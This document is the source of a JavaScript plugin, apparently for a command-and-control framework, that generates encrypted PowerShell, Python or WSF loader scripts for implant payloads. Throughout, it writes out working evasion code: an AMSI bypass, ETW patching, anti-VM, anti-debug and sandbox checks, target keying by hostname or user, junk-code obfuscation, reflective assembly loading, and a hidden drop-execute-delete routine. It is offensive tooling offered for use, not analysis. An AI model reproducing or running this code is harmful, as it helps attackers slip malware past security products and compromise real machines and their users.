// ============================================================
// Stage0 Generator v5 - Cradle Builder
// Template-based with chunking, env keying, junk code,
// callback execution, and polyglot WSF output.
// ============================================================

var metadata = {
    name:        "Stage0 Generator",
    description: "Encrypt/pack agent payloads into Python/PowerShell/WSF cradles with chunking, env keying & junk code",
    author:      "4rt3f4kt",
    version:     "5.0"
};

// ============================================================
// Helpers
// ============================================================
function randomHex(len)      { return ax.random_string(len, "hex"); }
function randomAlphaNum(len) { return ax.random_string(len, "alphanumeric"); }
function randomInt(min, max) { return ax.random_int(min, max); }

// Replace all occurrences of `search` in `str` with `rep`
function replaceAll(str, search, rep) {
    if (search == "") return str;
    while (str.indexOf(search) >= 0) {
        str = str.replace(search, rep);
    }
    return str;
}

// ============================================================
// Base64 text decoder (pure JS - for reading templates as text)
// ax.file_read() returns base64; this decodes to UTF-8 string.
// ============================================================
function b64decode(b64) {
    var table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    b64 = b64.replace(/[\s=]/g, "");
    var out = "";
    var bits = 0, collected = 0;
    for (var i = 0; i < b64.length; i++) {
        bits = (bits << 6) | table.indexOf(b64.charAt(i));
        collected += 6;
        if (collected >= 8) {
            collected -= 8;
            out += String.fromCharCode((bits >> collected) & 0xFF);
            bits &= (1 << collected) - 1;
        }
    }
    return out;
}

// ============================================================
// Template loader
// Reads a template file relative to the script directory.
// Returns the template text with {{PLACEHOLDER}} markers.
// ============================================================
function readTemplate(filename) {
    var path = ax.script_dir() + "/templates/" + filename;
    if (!ax.file_exists(path)) {
        ax.log_error("[Stage0] Template not found: " + path);
        return "";
    }
    var b64 = ax.file_read(path);
    if (!b64 || b64 == "") {
        ax.log_error("[Stage0] Failed to read template: " + path);
        return "";
    }
    return b64decode(b64);
}

// Apply a map of placeholder replacements to a template string.
// vars = { "KEY": "value", ... } -> replaces all {{KEY}} with value.
function applyTemplate(template, vars) {
    var result = template;
    for (var key in vars) {
        result = replaceAll(result, "{{" + key + "}}", vars[key]);
    }
    return result;
}

// ============================================================
// Payload block builder (normal or chunked)
// ============================================================
function buildPayloadBlock(isPython, encB64, varEnc, chunkEnabled, varRandomize) {
    if (!chunkEnabled) {
        if (isPython) {
            return varEnc + " = base64.b64decode(\n    \"" + encB64 + "\"\n)";
        } else {
            return varEnc + " = [Convert]::FromBase64String(\"" + encB64 + "\")";
        }
    }
    var chunkSize = randomInt(2000, 5000);
    var chunks = [];
    for (var i = 0; i < encB64.length; i += chunkSize) {
        var end = i + chunkSize;
        if (end > encB64.length) end = encB64.length;
        chunks.push(encB64.substring(i, end));
    }
    var block = "";
    var parts = [];
    for (var j = 0; j < chunks.length; j++) {
        var cv = isPython ? ("_" + randomAlphaNum(5)) : ("$" + randomAlphaNum(5));
        if (!varRandomize) cv = isPython ? ("_p" + j) : ("$p" + j);
        block += cv + " = \"" + chunks[j] + "\"\n";
        parts.push(cv);
    }
    if (isPython) {
        block += varEnc + " = base64.b64decode(" + parts.join(" + ") + ")";
    } else {
        block += varEnc + " = [Convert]::FromBase64String(" + parts.join(" + ") + ")";
    }
    return block;
}

// ============================================================
// Junk code generator
// ============================================================
function buildJunkCode(isPython, count) {
    var block = "";
    for (var i = 0; i < count; i++) {
        var vn = isPython ? ("_j" + randomAlphaNum(4)) : ("$j" + randomAlphaNum(4));
        var t = randomInt(0, 4);
        if (t == 0)      block += vn + " = \"" + randomAlphaNum(randomInt(8, 24)) + "\"\n";
        else if (t == 1) block += vn + " = " + randomInt(1, 9999) + "\n";
        else if (t == 2) {
            if (isPython) block += vn + " = len(\"" + randomAlphaNum(randomInt(3, 10)) + "\")\n";
            else          block += vn + " = \"" + randomAlphaNum(randomInt(3, 10)) + "\".Length\n";
        }
        else if (t == 3) block += vn + " = " + randomInt(10, 99) + " + " + randomInt(10, 99) + "\n";
        else {
            if (isPython) block += vn + " = [" + randomInt(1,9) + "," + randomInt(1,9) + "," + randomInt(1,9) + "]\n";
            else          block += vn + " = @(" + randomInt(1,9) + "," + randomInt(1,9) + "," + randomInt(1,9) + ")\n";
        }
    }
    return block;
}

// ============================================================
// Python PRE_CHECKS block builder
// ============================================================
function buildPythonPreChecks(cfg) {
    var block = "";

    if (cfg.anti_vm) {
        block += "\n";
        block += "def _chk_vm():\n";
        block += "    i=[]\n";
        block += "    try:\n";
        block += "        import uuid\n";
        block += "        m=':'.join(('%012x'%uuid.getnode())[j:j+2] for j in range(0,12,2))\n";
        block += "        for v in [\"00:0c:29\",\"00:50:56\",\"08:00:27\",\"00:1c:42\",\"00:16:3e\",\"00:15:5d\"]:\n";
        block += "            if m.startswith(v): i.append(1)\n";
        block += "    except: pass\n";
        block += "    try:\n";
        block += "        k=ctypes.windll.kernel32\n";
        block += "        if k.IsProcessorFeaturePresent(31): i.append(1)\n";
        block += "    except: pass\n";
        block += "    if len(i)>=1: sys.exit(0)\n";
        block += "_chk_vm()\n";
    }

    if (cfg.anti_debug) {
        block += "\nif ctypes.windll.kernel32.IsDebuggerPresent(): sys.exit(0)\n";
    }

    if (cfg.sandbox_sleep) {
        block += "\n_t0=time.time(); time.sleep(3)\n";
        block += "if(time.time()-_t0)<2.5: sys.exit(0)\n";
    }

    if (cfg.kill_date_enabled) {
        block += "\nfrom datetime import datetime\n";
        block += "if datetime.now()>datetime.strptime(\"" + cfg.kill_date + "\",\"%Y-%m-%d\"): sys.exit(0)\n";
    }

    if (cfg.startup_delay > 0) {
        block += "\ntime.sleep(" + cfg.startup_delay + ")\n";
    }

    // Environment keying
    if (cfg.env_hostname != "") {
        block += "\nimport socket\n";
        block += "if socket.gethostname().lower()!=\"" + cfg.env_hostname.toLowerCase() + "\": sys.exit(0)\n";
    }
    if (cfg.env_username != "") {
        block += "\nimport getpass\n";
        block += "if getpass.getuser().lower()!=\"" + cfg.env_username.toLowerCase() + "\": sys.exit(0)\n";
    }
    if (cfg.env_domain != "") {
        block += "\nif os.environ.get('USERDOMAIN','').lower()!=\"" + cfg.env_domain.toLowerCase() + "\": sys.exit(0)\n";
    }

    // Junk code
    if (cfg.junk_code) {
        block += "\n" + buildJunkCode(true, randomInt(5, 12));
    }

    return block;
}

// ============================================================
// PowerShell PRE_CHECKS block builder
// ============================================================
function buildPowerShellPreChecks(cfg) {
    var block = "";

    if (cfg.amsi_bypass) {
        block += "\n";
        block += "try {\n";
        block += "    $a=[Ref].Assembly.GetTypes()\n";
        block += "    foreach($b in $a){if($b.Name -like \"*iUtils\"){\n";
        block += "        $c=$b.GetFields('NonPublic,Static')\n";
        block += "        foreach($d in $c){if($d.Name -like \"*Context\"){$d.SetValue($null,[IntPtr]::Zero)}}\n";
        block += "    }}\n";
        block += "} catch {}\n";
    }

    if (cfg.etw_bypass) {
        block += "\n";
        block += "try {\n";
        block += "    $m=[System.Diagnostics.Eventing.EventProvider].GetMethod('m_WriteEvent',[Reflection.BindingFlags]'NonPublic,Instance')\n";
        block += "    if($m){[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xc3),0,$m.MethodHandle.GetFunctionPointer(),1)}\n";
        block += "} catch {}\n";
    }

    if (cfg.anti_debug) {
        block += "\n";
        block += "try {\n";
        block += "    Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class D{[DllImport(\"kernel32.dll\")]public static extern bool IsDebuggerPresent();}' -Language CSharp\n";
        block += "    if([D]::IsDebuggerPresent()){exit}\n";
        block += "} catch {}\n";
    }

    if (cfg.sandbox_sleep) {
        block += "\n";
        block += "$t0=[DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()\n";
        block += "Start-Sleep -Seconds 3\n";
        block += "if(([DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()-$t0) -lt 2500){exit}\n";
    }

    if (cfg.kill_date_enabled) {
        block += "\nif((Get-Date) -gt [DateTime]::Parse(\"" + cfg.kill_date + "\")){exit}\n";
    }

    if (cfg.startup_delay > 0) {
        block += "\nStart-Sleep -Seconds " + cfg.startup_delay + "\n";
    }

    // Environment keying
    if (cfg.env_hostname != "") {
        block += "\nif($env:COMPUTERNAME -ne \"" + cfg.env_hostname + "\"){exit}\n";
    }
    if (cfg.env_username != "") {
        block += "\nif($env:USERNAME -ne \"" + cfg.env_username + "\"){exit}\n";
    }
    if (cfg.env_domain != "") {
        block += "\nif($env:USERDOMAIN -ne \"" + cfg.env_domain + "\"){exit}\n";
    }

    // Junk code
    if (cfg.junk_code) {
        block += "\n" + buildJunkCode(false, randomInt(5, 12));
    }

    return block;
}

// ============================================================
// PowerShell EXE block builders (for cradle_exe.ps1)
// ============================================================
function buildPsReflectionBlock(vars) {
    var b = "";
    b += "# === Reflective .NET Load ===\n";
    b += "$assembly = [System.Reflection.Assembly]::Load(" + vars.V_BUF + ")\n";
    b += "$ep = $assembly.EntryPoint\n";
    b += "if ($ep) {\n";
    b += "    try { $ep.Invoke($null, @(,@())) } catch { $ep.Invoke($null, $null) }\n";
    b += "}\n";
    return b;
}

function buildPsDropBlock(vars) {
    var b = "";
    b += "# === Drop + Execute ===\n";
    b += vars.V_TMP + " = Join-Path $env:TEMP (\"" + vars.RAND_FILENAME + ".exe\")\n";
    b += "[System.IO.File]::WriteAllBytes(" + vars.V_TMP + ", " + vars.V_BUF + ")\n";
    b += "\n";
    b += "$si = New-Object System.Diagnostics.ProcessStartInfo\n";
    b += "$si.FileName = " + vars.V_TMP + "\n";
    b += "$si.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden\n";
    b += "$si.CreateNoWindow = $true\n";
    b += "[System.Diagnostics.Process]::Start($si) | Out-Null\n";
    b += "\n";
    b += "Start-Sleep -Seconds 5\n";
    b += "try { Remove-Item -Path " + vars.V_TMP + " -Force -ErrorAction SilentlyContinue } catch {}\n";
    return b;
}

// ============================================================
// Main cradle generation function
// ============================================================
function generateCradle(cfg) {
    // --- Determine template filename ---
    var isPython     = cfg.cradle_lang == "Python";
    var isShellcode  = cfg.payload_type == "shellcode";
    var useCallback  = cfg.exec_method == "callback";

    var templateFile = "";
    if (isPython && isShellcode && useCallback)       templateFile = "cradle_shellcode_callback.py";
    else if (isPython && isShellcode)                 templateFile = "cradle_shellcode.py";
    else if (isPython && !isShellcode)                templateFile = "cradle_exe.py";
    else if (!isPython && isShellcode && useCallback) templateFile = "cradle_shellcode_callback.ps1";
    else if (!isPython && isShellcode)                templateFile = "cradle_shellcode.ps1";
    else                                             templateFile = "cradle_exe.ps1";

    // --- Load template ---
    var template = readTemplate(templateFile);
    if (template == "") {
        ax.show_message("Error", "Failed to load template: " + templateFile);
        return "";
    }

    // --- Build variable names ---
    var vr = cfg.var_randomization;
    var vars = {};

    if (isPython) {
        vars.V_KEY      = vr ? randomAlphaNum(8)  : "xor_key";
        vars.V_ENC      = vr ? randomAlphaNum(8)  : "enc_payload";
        vars.V_BUF      = vr ? randomAlphaNum(6)  : "sc_buf";
        vars.V_PTR      = vr ? randomAlphaNum(6)  : "ptr";
        vars.V_HT       = vr ? randomAlphaNum(6)  : "ht";
        vars.V_TMP      = vr ? randomAlphaNum(6)  : "tmp_path";
        vars.FN_DECRYPT = vr ? randomAlphaNum(10) : "decrypt";
        vars.FN_EXECUTE = vr ? randomAlphaNum(10) : "execute";
    } else {
        vars.V_KEY      = vr ? ("$" + randomAlphaNum(8))  : "$xorKey";
        vars.V_ENC      = vr ? ("$" + randomAlphaNum(8))  : "$encPayload";
        vars.V_BUF      = vr ? ("$" + randomAlphaNum(6))  : "$scBuf";
        vars.V_PTR      = vr ? ("$" + randomAlphaNum(6))  : "$ptr";
        vars.V_HT       = vr ? ("$" + randomAlphaNum(6))  : "$hThread";
        vars.V_TMP      = vr ? ("$" + randomAlphaNum(6))  : "$tmpPath";
        vars.FN_DECRYPT = vr ? randomAlphaNum(10) : "Decrypt-Payload";
        vars.FN_EXECUTE = vr ? randomAlphaNum(10) : "Execute-Payload";
    }

    vars.RAND_FILENAME = randomAlphaNum(8);

    // Callback class name (PS only)
    if (!isPython && useCallback) {
        vars.V_CB = vr ? randomAlphaNum(8) : "CbExec";
    }

    // --- Payload block (normal or chunked) ---
    vars.XOR_KEY_B64 = cfg.xor_key_b64;
    vars.PAYLOAD_BLOCK = buildPayloadBlock(isPython, cfg.encrypted_payload_b64,
        isPython ? vars.V_ENC : vars.V_ENC, cfg.chunk_payload, vr);

    // --- Pre-checks ---
    if (isPython) {
        vars.PRE_CHECKS = buildPythonPreChecks(cfg);
    } else {
        vars.PRE_CHECKS = buildPowerShellPreChecks(cfg);
    }

    // --- EXE block (PowerShell only) ---
    if (!isPython && !isShellcode) {
        if (cfg.exe_method == "reflection") {
            vars.EXE_BLOCK = buildPsReflectionBlock(vars);
        } else {
            vars.EXE_BLOCK = buildPsDropBlock(vars);
        }
    }

    // --- Apply template ---
    return applyTemplate(template, vars);
}

// ============================================================
// Polyglot WSF generator
// Generates a PS cradle first, then wraps it in WSF polyglot
// ============================================================
function generatePolyglotWSF(cfg) {
    // Force PowerShell for the inner cradle
    cfg.cradle_lang = "PowerShell";
    var psScript = generateCradle(cfg);
    if (psScript == "") return "";

    // UTF-16LE encode the PS script for -EncodedCommand
    var utf16 = "";
    for (var i = 0; i < psScript.length; i++) {
        var c = psScript.charCodeAt(i);
        utf16 += String.fromCharCode(c & 0xFF);
        utf16 += String.fromCharCode((c >> 8) & 0xFF);
    }
    var psEncoded = ax.encode_data("base64", utf16);

    // Load WSF template
    var template = readTemplate("cradle_polyglot.wsf");
    if (template == "") {
        ax.show_message("Error", "Failed to load template: cradle_polyglot.wsf");
        return "";
    }

    var vr = cfg.var_randomization;
    var vars = {
        WSF_JOB:     vr ? randomAlphaNum(6) : "stage0",
        JSF_ENTRY:   vr ? randomAlphaNum(8) : "execute",
        JSV_SHELL:   vr ? randomAlphaNum(6) : "wsh",
        JSV_CMD:     vr ? randomAlphaNum(6) : "cmd",
        VBF_CALLER:  vr ? randomAlphaNum(8) : "RunMain",
        PS_ENCODED:  psEncoded
    };

    return applyTemplate(template, vars);
}

// ============================================================
// Known agent types (informational - update as needed)
// ============================================================
var KNOWN_AGENTS = [
    { name: "Beacon",   arch: "x64", format: "EXE",       desc: "Primary implant with sleep obfuscation" },
    { name: "Beacon",   arch: "x64", format: "Shellcode (.bin)", desc: "Primary implant - raw shellcode" },
    { name: "Gopher",   arch: "x64", format: "EXE",       desc: "Lightweight HTTP/S implant" },
    { name: "Kharon",   arch: "x64", format: "EXE",       desc: "Stealth implant with advanced evasion" },
    { name: "Kharon",   arch: "x64", format: "Shellcode (.bin)", desc: "Stealth implant - raw shellcode" },
    { name: "Maverick", arch: "x64", format: "EXE",       desc: "Modular implant framework" },
    { name: "Maverick", arch: "x64", format: "Shellcode (.bin)", desc: "Modular implant - raw shellcode" },
    { name: "Griffon",  arch: "x64", format: "EXE",       desc: "Stealthy persistence agent" }
];

function showAgentTypesInfo() {
    var msg = "Available agent types (generate via Listener context menu):\n\n";
    for (var i = 0; i < KNOWN_AGENTS.length; i++) {
        var a = KNOWN_AGENTS[i];
        msg += "  " + a.name + "  [" + a.arch + "]  " + a.format + "\n";
        msg += "     " + a.desc + "\n\n";
    }
    msg += "---\n";
    msg += "To generate: Right-click Listener > Generate Agent\n";
    msg += "Then upload the output file here as payload.";
    ax.show_message("Agent Types Reference", msg);
}

// ============================================================
// GUI - Stage0 Generator Dialog
// ============================================================
function openStage0Dialog() {

    // =============================================
    // Payload Input Section
    // =============================================
    var payload_group = form.create_groupbox("Payload Input", false);

    var labelPayloadType = form.create_label("Payload Type:");
    var comboPayloadType = form.create_combo();
    comboPayloadType.setItems(["Shellcode (.bin)", "Executable (.exe)"]);

    var labelPayloadFile = form.create_label("Payload File:");
    var selectorPayload  = form.create_selector_file();
    selectorPayload.setPlaceholder("Select shellcode (.bin) or agent (.exe)");

    var labelPayloadSize = form.create_label("Size: -");

    // Agent types reference button
    var btnAgentInfo = form.create_button("Agent Types...");
    form.connect(btnAgentInfo, "clicked", function() {
        showAgentTypesInfo();
    });

    var layout_payload = form.create_gridlayout();
    layout_payload.addWidget(labelPayloadType, 0, 0, 1, 1);
    layout_payload.addWidget(comboPayloadType, 0, 1, 1, 1);
    layout_payload.addWidget(btnAgentInfo,     0, 2, 1, 1);
    layout_payload.addWidget(labelPayloadFile, 1, 0, 1, 1);
    layout_payload.addWidget(selectorPayload,  1, 1, 1, 2);
    layout_payload.addWidget(labelPayloadSize, 2, 0, 1, 3);

    var panel_payload = form.create_panel();
    panel_payload.setLayout(layout_payload);
    payload_group.setPanel(panel_payload);

    // =============================================
    // Cradle Output Format
    // =============================================
    var output_group = form.create_groupbox("Output Format", false);

    var labelFormat = form.create_label("Cradle Language:");
    var comboFormat = form.create_combo();
    comboFormat.setItems(["PowerShell", "Python", "Polyglot WSF (.wsf)"]);

    var labelExeMethod = form.create_label("EXE Loading:");
    var comboExeMethod = form.create_combo();
    comboExeMethod.setItems(["Reflective (.NET Assembly.Load)", "Drop to disk + Execute"]);

    var labelExecMethod = form.create_label("Execution:");
    var comboExecMethod = form.create_combo();
    comboExecMethod.setItems(["Classic (CreateThread)", "Callback (no CreateThread)"]);

    // Show/hide exe method / exec method based on payload type
    labelExeMethod.setVisible(false);
    comboExeMethod.setVisible(false);
    labelExecMethod.setVisible(true);
    comboExecMethod.setVisible(true);
    form.connect(comboPayloadType, "currentTextChanged", function(text) {
        var isExe = (text == "Executable (.exe)");
        labelExeMethod.setVisible(isExe);
        comboExeMethod.setVisible(isExe);
        labelExecMethod.setVisible(!isExe);
        comboExecMethod.setVisible(!isExe);
    });

    var layout_output = form.create_gridlayout();
    layout_output.addWidget(labelFormat,     0, 0, 1, 1);
    layout_output.addWidget(comboFormat,     0, 1, 1, 2);
    layout_output.addWidget(labelExeMethod,  1, 0, 1, 1);
    layout_output.addWidget(comboExeMethod,  1, 1, 1, 2);
    layout_output.addWidget(labelExecMethod, 2, 0, 1, 1);
    layout_output.addWidget(comboExecMethod, 2, 1, 1, 2);

    var panel_output = form.create_panel();
    panel_output.setLayout(layout_output);
    output_group.setPanel(panel_output);

    // =============================================
    // Encryption settings
    // =============================================
    var enc_group = form.create_groupbox("Encryption", false);

    var labelEncType = form.create_label("Method:");
    var comboEncType = form.create_combo();
    comboEncType.setItems(["XOR (random key)", "XOR (custom key)"]);

    var labelKeyLen = form.create_label("Key Length:");
    var spinKeyLen = form.create_spin();
    spinKeyLen.setRange(8, 128);
    spinKeyLen.setValue(32);

    var labelEncKey = form.create_label("Custom Key:");
    var textEncKey = form.create_textline();
    textEncKey.setPlaceholder("Enter custom XOR key");
    textEncKey.setVisible(false);
    labelEncKey.setVisible(false);

    form.connect(comboEncType, "currentTextChanged", function(text) {
        var custom = (text == "XOR (custom key)");
        labelEncKey.setVisible(custom);
        textEncKey.setVisible(custom);
        labelKeyLen.setVisible(!custom);
        spinKeyLen.setVisible(!custom);
    });

    var layout_enc = form.create_gridlayout();
    layout_enc.addWidget(labelEncType, 0, 0, 1, 1);
    layout_enc.addWidget(comboEncType, 0, 1, 1, 2);
    layout_enc.addWidget(labelKeyLen,  1, 0, 1, 1);
    layout_enc.addWidget(spinKeyLen,   1, 1, 1, 2);
    layout_enc.addWidget(labelEncKey,  2, 0, 1, 1);
    layout_enc.addWidget(textEncKey,   2, 1, 1, 2);

    var panel_enc = form.create_panel();
    panel_enc.setLayout(layout_enc);
    enc_group.setPanel(panel_enc);

    // =============================================
    // Evasion settings
    // =============================================
    var evasion_group = form.create_groupbox("Evasion (Cradle)", true);
    evasion_group.setChecked(true);

    var checkAMSI     = form.create_check("AMSI Bypass (PS only)");    checkAMSI.setChecked(true);
    var checkETW      = form.create_check("ETW Patching (PS only)");   checkETW.setChecked(true);
    var checkAntiVM   = form.create_check("Anti-VM");                  checkAntiVM.setChecked(false);
    var checkAntiDbg  = form.create_check("Anti-Debug");               checkAntiDbg.setChecked(false);
    var checkSandbox  = form.create_check("Sandbox Sleep Check");      checkSandbox.setChecked(false);
    var checkVarRand  = form.create_check("Randomize Variables");      checkVarRand.setChecked(true);

    var layout_evasion = form.create_gridlayout();
    layout_evasion.addWidget(checkAMSI,    0, 0, 1, 1);
    layout_evasion.addWidget(checkETW,     0, 1, 1, 1);
    layout_evasion.addWidget(checkAntiVM,  1, 0, 1, 1);
    layout_evasion.addWidget(checkAntiDbg, 1, 1, 1, 1);
    layout_evasion.addWidget(checkSandbox, 2, 0, 1, 1);
    layout_evasion.addWidget(checkVarRand, 2, 1, 1, 1);

    var panel_evasion = form.create_panel();
    panel_evasion.setLayout(layout_evasion);
    evasion_group.setPanel(panel_evasion);

    // =============================================
    // Environment Keying
    // =============================================
    var envkey_group = form.create_groupbox("Environment Keying (Target Lock)", true);
    envkey_group.setChecked(false);

    var labelEnvHost = form.create_label("Hostname:");
    var textEnvHost = form.create_textline();
    textEnvHost.setPlaceholder("e.g. WORKSTATION-01");

    var labelEnvUser = form.create_label("Username:");
    var textEnvUser = form.create_textline();
    textEnvUser.setPlaceholder("e.g. john.doe");

    var labelEnvDomain = form.create_label("Domain:");
    var textEnvDomain = form.create_textline();
    textEnvDomain.setPlaceholder("e.g. CORP");

    var layout_envkey = form.create_gridlayout();
    layout_envkey.addWidget(labelEnvHost,   0, 0, 1, 1);
    layout_envkey.addWidget(textEnvHost,    0, 1, 1, 2);
    layout_envkey.addWidget(labelEnvUser,   1, 0, 1, 1);
    layout_envkey.addWidget(textEnvUser,    1, 1, 1, 2);
    layout_envkey.addWidget(labelEnvDomain, 2, 0, 1, 1);
    layout_envkey.addWidget(textEnvDomain,  2, 1, 1, 2);

    var panel_envkey = form.create_panel();
    panel_envkey.setLayout(layout_envkey);
    envkey_group.setPanel(panel_envkey);

    // =============================================
    // Advanced Options
    // =============================================
    var advanced_group = form.create_groupbox("Advanced", true);
    advanced_group.setChecked(false);

    var checkChunking = form.create_check("Chunk payload (split base64 blob)");
    checkChunking.setChecked(true);
    var checkJunkCode = form.create_check("Inject junk code (polymorphic)");
    checkJunkCode.setChecked(true);

    var layout_advanced = form.create_gridlayout();
    layout_advanced.addWidget(checkChunking, 0, 0, 1, 1);
    layout_advanced.addWidget(checkJunkCode, 0, 1, 1, 1);

    var panel_advanced = form.create_panel();
    panel_advanced.setLayout(layout_advanced);
    advanced_group.setPanel(panel_advanced);

    // =============================================
    // Kill date / Startup delay
    // =============================================
    var timing_group = form.create_groupbox("Timing / Kill Date", true);
    timing_group.setChecked(false);

    var labelDelay = form.create_label("Startup Delay (s):");
    var spinDelay = form.create_spin();
    spinDelay.setRange(0, 3600);
    spinDelay.setValue(0);

    var checkKillDate = form.create_check("Enable Kill Date");
    checkKillDate.setChecked(false);
    var textKillDate  = form.create_dateline("yyyy-MM-dd");
    textKillDate.setEnabled(false);

    form.connect(checkKillDate, "stateChanged", function() {
        textKillDate.setEnabled(checkKillDate.isChecked());
    });

    var layout_timing = form.create_gridlayout();
    layout_timing.addWidget(labelDelay,    0, 0, 1, 1);
    layout_timing.addWidget(spinDelay,     0, 1, 1, 1);
    layout_timing.addWidget(checkKillDate, 1, 0, 1, 1);
    layout_timing.addWidget(textKillDate,  1, 1, 1, 1);

    var panel_timing = form.create_panel();
    panel_timing.setLayout(layout_timing);
    timing_group.setPanel(panel_timing);

    // =============================================
    // Output preview
    // =============================================
    var outputPreview = form.create_textmulti();
    outputPreview.setReadOnly(true);
    outputPreview.setPlaceholder("Click 'Generate Cradle' to build the output script...");

    // =============================================
    // Buttons
    // =============================================
    var btnGenerate = form.create_button("Generate Cradle");
    var btnCopy     = form.create_button("Copy to Clipboard");
    var btnSave     = form.create_button("Save to File");
    btnCopy.setEnabled(false);
    btnSave.setEnabled(false);

    // =============================================
    // GENERATE logic
    // =============================================
    form.connect(btnGenerate, "clicked", function() {

        // --- Extract payload from file selector ---
        var container_tmp = form.create_container();
        container_tmp.put("file", selectorPayload);
        var jsonData = container_tmp.toJson();
        var parsed = JSON.parse(jsonData);
        var payloadB64 = parsed["file"];

        if (!payloadB64 || payloadB64 == "") {
            ax.show_message("Error", "Please select a payload file first.");
            return;
        }

        // --- Build XOR key ---
        var xorKeyStr = "";
        if (comboEncType.currentText() == "XOR (custom key)") {
            xorKeyStr = textEncKey.text();
            if (xorKeyStr == "") {
                ax.show_message("Error", "Please enter a custom XOR key.");
                return;
            }
        } else {
            xorKeyStr = randomAlphaNum(spinKeyLen.value());
        }

        // --- Write raw payload to temp, encrypt with XOR ---
        var tmpId = randomHex(8);
        var tmp_raw = "/tmp/.stage0_raw_" + tmpId;

        // Write raw binary from base64 selector data
        ax.file_write_binary(tmp_raw, payloadB64);

        // Show file size
        var fsize = ax.file_size(tmp_raw);
        labelPayloadSize.setText("Size: " + ax.format_size(fsize));

        // XOR-encrypt raw binary (encode_file reads file bytes, XORs, returns base64)
        var encryptedB64 = ax.encode_file("xor", tmp_raw, xorKeyStr);

        // Base64-encode the key for embedding in cradle
        var xorKeyB64 = ax.encode_data("base64", xorKeyStr);

        // --- Build config ---
        var evasionOn = evasion_group.isChecked();
        var timingOn  = timing_group.isChecked();

        var isShellcode  = (comboPayloadType.currentText() == "Shellcode (.bin)");
        var isPowerShell = (comboFormat.currentText() == "PowerShell");
        var isWSF        = (comboFormat.currentText() == "Polyglot WSF (.wsf)");
        var useCallback  = isShellcode && (comboExecMethod.currentIndex() == 1);
        var envKeyOn     = envkey_group.isChecked();
        var advancedOn   = advanced_group.isChecked();

        var cfg = {
            cradle_lang:          (isPowerShell || isWSF) ? "PowerShell" : "Python",
            exec_method:          useCallback ? "callback" : "classic",
            payload_type:         isShellcode ? "shellcode" : "exe",
            encrypted_payload_b64: encryptedB64,
            xor_key_b64:          xorKeyB64,
            amsi_bypass:          evasionOn && checkAMSI.isChecked(),
            etw_bypass:           evasionOn && checkETW.isChecked(),
            anti_vm:              evasionOn && checkAntiVM.isChecked(),
            anti_debug:           evasionOn && checkAntiDbg.isChecked(),
            sandbox_sleep:        evasionOn && checkSandbox.isChecked(),
            var_randomization:    evasionOn && checkVarRand.isChecked(),
            startup_delay:        timingOn ? spinDelay.value() : 0,
            kill_date_enabled:    timingOn && checkKillDate.isChecked(),
            kill_date:            textKillDate.dateString(),
            exe_method:           comboExeMethod.currentIndex() == 0 ? "reflection" : "drop",
            env_hostname:         envKeyOn ? textEnvHost.text() : "",
            env_username:         envKeyOn ? textEnvUser.text() : "",
            env_domain:           envKeyOn ? textEnvDomain.text() : "",
            chunk_payload:        advancedOn && checkChunking.isChecked(),
            junk_code:            advancedOn && checkJunkCode.isChecked()
        };

        // --- Generate cradle from template ---
        var script = "";
        if (isWSF) {
            script = generatePolyglotWSF(cfg);
        } else {
            script = generateCradle(cfg);
        }
        if (script == "") return;

        outputPreview.setText(script);
        btnCopy.setEnabled(true);
        btnSave.setEnabled(true);

        ax.show_message("Stage0",
            "Cradle generated!\n" +
            "Payload: " + ax.format_size(fsize) +
            " | Key: " + xorKeyStr.length + " bytes" +
            " | Format: " + (isWSF ? "WSF" : (isPowerShell ? "PS" : "Py")) +
            " | " + (isShellcode ? (useCallback ? "callback" : "shellcode") : "exe") +
            (cfg.chunk_payload ? " | chunked" : "") +
            (cfg.junk_code ? " | junk" : "") +
            (envKeyOn ? " | env-keyed" : ""));
    });

    // Copy handler
    form.connect(btnCopy, "clicked", function() {
        ax.copy_to_clipboard(outputPreview.text());
        ax.show_message("Stage0", "Cradle script copied to clipboard.");
    });

    // Save handler
    form.connect(btnSave, "clicked", function() {
        var fmt = comboFormat.currentText();
        var ext = (fmt == "Python") ? ".py" : (fmt == "Polyglot WSF (.wsf)") ? ".wsf" : ".ps1";
        var filename = "stage0_cradle_" + randomHex(6) + ext;
        var savePath = ax.prompt_save_file(filename, "Save Stage0 Cradle");
        if (savePath != "") {
            if (ax.file_write_text(savePath, outputPreview.text())) {
                ax.show_message("Stage0", "Cradle saved to:\n" + savePath);
            } else {
                ax.show_message("Error", "Failed to save file.");
            }
        }
    });

    // =============================================
    // Main Layout Assembly
    // =============================================
    var layout_scroll = form.create_vlayout();
    layout_scroll.addWidget(payload_group);
    layout_scroll.addWidget(output_group);
    layout_scroll.addWidget(enc_group);
    layout_scroll.addWidget(evasion_group);
    layout_scroll.addWidget(envkey_group);
    layout_scroll.addWidget(advanced_group);
    layout_scroll.addWidget(timing_group);

    var panel_scroll = form.create_panel();
    panel_scroll.setLayout(layout_scroll);

    var scroll = form.create_scrollarea();
    scroll.setPanel(panel_scroll);

    var layout_buttons = form.create_hlayout();
    layout_buttons.addWidget(btnGenerate);
    layout_buttons.addWidget(btnCopy);
    layout_buttons.addWidget(btnSave);
    var panel_buttons = form.create_panel();
    panel_buttons.setLayout(layout_buttons);

    var layout_main = form.create_vlayout();
    layout_main.addWidget(scroll);
    layout_main.addWidget(form.create_hline());
    layout_main.addWidget(panel_buttons);
    layout_main.addWidget(form.create_label("Generated Cradle:"));
    layout_main.addWidget(outputPreview);

    var dialog = form.create_dialog("Stage0 Generator v5 - Advanced Cradle Builder");
    dialog.setSize(800, 850);
    dialog.setLayout(layout_main);
    dialog.exec();
}

// ============================================================
// Register Menu in Main Menu Bar
// ============================================================
var stage0_action = menu.create_action("Stage0 Generator", function() {
    openStage0Dialog();
});
menu.add_main_axscript(stage0_action);

ax.log("[+] Stage0 Generator v5.0 loaded - Advanced Cradle Builder");
